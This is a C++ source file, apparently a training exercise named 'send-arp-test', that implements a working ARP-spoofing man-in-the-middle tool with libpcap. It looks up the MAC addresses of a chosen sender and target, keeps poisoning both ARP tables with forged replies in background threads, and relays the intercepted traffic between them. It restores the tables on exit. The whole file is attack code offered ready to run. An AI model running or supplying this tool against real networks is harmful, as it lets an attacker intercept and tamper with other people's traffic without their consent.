#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
//#include <pthread.h>
#include <signal.h>
#include <thread>

#include "src/ethhdr.h"
#include "src/arphdr.h"

#define ETHER_ADDR_LEN 6
#define ETHER_HDR_LEN 14
#define IP_LEN 4

pthread_mutex_t mutex_lock;

int infectStop = 0;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct libnet_ethernet_hdr
{
	u_int8_t  ether_dhost[ETHER_ADDR_LEN];/* destination ethernet address */
	u_int8_t  ether_shost[ETHER_ADDR_LEN];/* source ethernet address */
	u_int16_t ether_type;                 /* protocol */
};

struct arp_ether_ipv4{
	u_int16_t htype;   /* Format of hardware address */
	u_int16_t ptype;   /* Format of protocol address */
	u_int8_t hlen;    /* Length of hardware address */
	u_int8_t plen;    /* Length of protocol address */
	u_int16_t op;    /* ARP opcode (command) */
	u_int8_t smac[ETHER_ADDR_LEN];  /* Sender hardware address */
	u_int8_t sip[IP_LEN];   /* Sender IP address */
	u_int8_t tmac[ETHER_ADDR_LEN];  /* Target hardware address */
	u_int8_t tip[IP_LEN];   /* Target IP address */
} ;

struct arpSendInfo{
	Mac eth_dmac;
	Mac eth_smac;
	int isRequest;
	Mac arp_smac;
	Ip arp_sip;
	Mac arp_tmac;
	Ip arp_tip;
};

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void sigint_handler (int sig)
{
	infectStop = 1;
	printf("Exiting program\n");
}

Mac getMyMACaddress(char* interface)
{
	Mac resultMac;
	struct ifreq ifr;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(ifr.ifr_name, interface);
	if (fd==-1) {
	    perror("Error while getting Mac address");
	    exit(EXIT_FAILURE);
	}
	
	if (ioctl(fd,SIOCGIFHWADDR,&ifr)==-1) {
	    close(fd);
	    perror("Error while getting Mac address");
	    exit(EXIT_FAILURE);
	}
	
	resultMac = Mac((uint8_t*)&ifr.ifr_addr.sa_data);
	
	close(fd);
	return resultMac;
}

Ip getMyIPaddress(char* interface)
{
	Ip resultIp;
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	strcpy(ifr.ifr_name, interface);
	if (fd==-1) {
	    perror("Error while getting Mac address");
	    exit(EXIT_FAILURE);
	}
	
	if (ioctl(fd,SIOCGIFADDR,&ifr)==-1) {
	    close(fd);
	    perror("Error while getting Ip address");
	    exit(EXIT_FAILURE);
	}
	
	resultIp = Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
	
	return resultIp;
}

int sendArpPacket(char *device, pcap_t* handle, Mac eth_dmac, Mac eth_smac, int isRequest, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
{	
	EthArpPacket packet;
	packet.eth_.dmac_ = eth_dmac; //sender's MAC address
	packet.eth_.smac_ = eth_smac; //My MAC address
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(isRequest?ArpHdr::Request:ArpHdr::Reply); // REPLY
	packet.arp_.smac_ = arp_smac; // My MAC address
	packet.arp_.sip_ = htonl(arp_sip); // target ip address
	packet.arp_.tmac_ = arp_tmac; // You's MAC address
	packet.arp_.tip_ = htonl(arp_tip); // You's IP

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    	exit(EXIT_FAILURE);
	}
	
	return 0;
}

int sendArpPacket(char *device, pcap_t* handle, struct arpSendInfo packetInfo)
{
	EthArpPacket packet;
	packet.eth_.dmac_ = packetInfo.eth_dmac; //sender's MAC address
	packet.eth_.smac_ = packetInfo.eth_smac; //My MAC address
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(packetInfo.isRequest?ArpHdr::Request:ArpHdr::Reply); // REPLY
	packet.arp_.smac_ = packetInfo.arp_smac; // My MAC address
	packet.arp_.sip_ = htonl(packetInfo.arp_sip); // target ip address
	packet.arp_.tmac_ = packetInfo.arp_tmac; // You's MAC address
	packet.arp_.tip_ = htonl(packetInfo.arp_tip); // You's IP

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    	exit(EXIT_FAILURE);
	}
	
	return 0;
}

void print_bytes(u_int8_t* bytes, size_t num)
{
	for (size_t i = 0; i < num; i++)
		printf("%2X ", bytes[i]);
}

Mac getMACwithIP(char *device, pcap_t* handle, Ip inputIP, Mac myMACaddress, Ip myIPaddress)
{
	Mac eth_dmac = Mac("ff:ff:ff:ff:ff:ff");
	Mac eth_smac = myMACaddress;
	int isRequest = 1;
	Mac arp_smac = myMACaddress;
	Ip arp_sip = myIPaddress;
	Mac arp_tmac = Mac("00:00:00:00:00:00");
	Ip arp_tip = inputIP;
	
	Mac resultMac;
	
	sendArpPacket(device, handle, eth_dmac, eth_smac, isRequest, arp_smac, arp_sip, arp_tmac, arp_tip);

	int count = 0;
	while (true) {
		count += 1;
		if (count >= 100)
		{
			sendArpPacket(device, handle, eth_dmac, eth_smac, isRequest, arp_smac, arp_sip, arp_tmac, arp_tip);
				
			count = 0;
		}
		struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* ethernetVar;
		struct arp_ether_ipv4* arpVar;
		const u_char* packet;
		Ip sip;
		
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		ethernetVar = (struct libnet_ethernet_hdr*)(packet);
		if (ntohs(ethernetVar->ether_type) != 0x0806) continue;
		arpVar = (struct arp_ether_ipv4*)(packet + ETHER_HDR_LEN);
		sip = Ip(ntohl(arpVar->sip[0] | (arpVar->sip[1] << 8) | (arpVar->sip[2] << 16) | (arpVar->sip[3] << 24)));
		
		if(sip == inputIP)
		{
			resultMac = Mac(ethernetVar->ether_shost);
			break;
		}
	}
		
	return resultMac;
}

void infectArpTable(char *device, pcap_t* handle, struct arpSendInfo infectPacketInfo)
{
	printf("Infecting!\n");
	while(!infectStop)
	{
		sleep(2);
		sendArpPacket(device, handle, infectPacketInfo);
	}
}

void replayPackets(char *device, pcap_t* handle, struct arpSendInfo senderInfectPacket, struct arpSendInfo targetInfectPacket, Mac senderMac, Mac targetMac, Mac myMac)
{
	printf("relay!\n");
	while (!infectStop)
	{
		struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* ethernetVar;
		Mac sourceMac;
		Mac destMac;
		int isSender;
		struct arp_ether_ipv4* arpVar;
		const u_char* packet;
		u_char* packetToSend;
		
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		ethernetVar = (struct libnet_ethernet_hdr*)(packet);
		sourceMac = Mac(ethernetVar->ether_shost);
		destMac = Mac(ethernetVar->ether_dhost);
		if (sourceMac == senderMac) isSender = 1;
		else if(sourceMac == targetMac) isSender = 0;
		else continue;
		
		if (ntohs(ethernetVar->ether_type) == 0x0806)
		{
			sendArpPacket(device, handle, isSender?senderInfectPacket:targetInfectPacket);
		}
		else//(ntohs(ethernetVar->ether_type) == 0x0800)
		{
			memcpy(ethernetVar->ether_shost, (uint8_t*)myMac, ETHER_ADDR_LEN);
			memcpy(ethernetVar->ether_dhost, isSender?(uint8_t*)targetMac:(uint8_t*)senderMac, ETHER_ADDR_LEN);
			
			struct libnet_ethernet_hdr* ethernetVarHehe = (struct libnet_ethernet_hdr*)(packet);
			pcap_sendpacket(handle, packet,header->caplen);
		}
	}
}

int main(int argc, char* argv[]) {

	if (argc < 4 && argc%2==1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	signal(SIGINT, sigint_handler);
	
	Mac myMACaddress;
	Ip myIPaddress;
	
	printf("Getting My MAC address\n");
	myMACaddress = getMyMACaddress(dev);
	printf("%s\n", std::string(myMACaddress).data());
	
	printf("Getting My IP address\n");
	myIPaddress = getMyIPaddress(dev);
	printf("%s\n", std::string(myIPaddress).data());
	
	Ip senderIP[(argc-2)/2];
	Mac senderMACaddress[(argc-2)/2];	
	Ip targetIP[(argc-2)/2];
	Mac targetMACaddress[(argc-2)/2];
	
	std::thread t_sinfect[(argc-2)/2];
	std::thread t_tinfect[(argc-2)/2];
	std::thread t_relay[(argc-2)/2];

	int i = (argc-2)/2;
	for(i = 0; i < (argc-2)/2;i++)
	{
		senderIP[i] = Ip(argv[2+i*2]);
		targetIP[i] = Ip(argv[3+i*2]);
		printf("Getting Sender's(%s) MAC address\n", std::string(senderIP[i]).data());
		senderMACaddress[i] = getMACwithIP(dev, handle, senderIP[i], myMACaddress, myIPaddress);
		printf("Getting Target's(%s) MAC address\n", std::string(targetIP[i]).data());
		targetMACaddress[i] = getMACwithIP(dev, handle, targetIP[i], myMACaddress, myIPaddress);
		
		struct arpSendInfo senderInfectInfo;
		senderInfectInfo.eth_dmac = senderMACaddress[i];
		senderInfectInfo.eth_smac = myMACaddress;
		senderInfectInfo.isRequest = false;
		senderInfectInfo.arp_smac = myMACaddress;
		senderInfectInfo.arp_sip = targetIP[i];
		senderInfectInfo.arp_tmac = senderMACaddress[i];
		senderInfectInfo.arp_tip = senderIP[i];
		
		struct arpSendInfo targetInfectInfo;
		targetInfectInfo.eth_dmac = targetMACaddress[i];
		targetInfectInfo.eth_smac = myMACaddress;
		targetInfectInfo.isRequest = false;
		targetInfectInfo.arp_smac = myMACaddress;
		targetInfectInfo.arp_sip = senderIP[i];
		targetInfectInfo.arp_tmac = targetMACaddress[i];
		targetInfectInfo.arp_tip = targetIP[i];
			
		printf("Hacking Sender's(%s) ARP table\n", std::string(senderIP[i]).data());
		
		t_sinfect[i] = std::thread(infectArpTable, dev, handle, senderInfectInfo);
		t_tinfect[i] = std::thread(infectArpTable, dev, handle, targetInfectInfo);
		t_relay[i] = std::thread(replayPackets, dev, handle, senderInfectInfo, targetInfectInfo, senderMACaddress[i], targetMACaddress[i], myMACaddress);
		
	}
	for(i = 0; i < (argc-2)/2;i++)
	{
		t_sinfect[i].join();
		t_tinfect[i].join();
		t_relay[i].join();
		
		sendArpPacket(dev, handle, senderMACaddress[i], targetMACaddress[i], false, targetMACaddress[i], targetIP[i], senderMACaddress[i], senderIP[i]);
		sendArpPacket(dev, handle, targetMACaddress[i], senderMACaddress[i], false, senderMACaddress[i], senderIP[i], targetMACaddress[i], targetIP[i]);
	}
	pcap_close(handle);
}
